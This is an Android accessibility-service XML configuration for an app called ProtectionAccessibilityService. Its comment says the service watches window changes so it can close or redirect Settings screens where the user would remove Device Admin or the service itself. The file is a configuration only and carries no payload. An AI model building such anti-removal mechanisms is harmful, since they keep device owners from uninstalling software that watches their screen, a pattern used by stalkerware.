<?xml version="1.0" encoding="utf-8"?>
<!--
    Accessibility service configuration for ProtectionAccessibilityService.
    Monitors window state changes so the service can detect when the user
    navigates to Settings screens that would let them remove Device Admin or
    the accessibility service itself, and immediately close/redirect those screens.
-->
<accessibility-service
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault"
    android:canRetrieveWindowContent="true"
    android:description="@string/accessibility_service_description"
    android:notificationTimeout="100"
    android:packageNames=""
    android:settingsActivity=".MainActivity" />
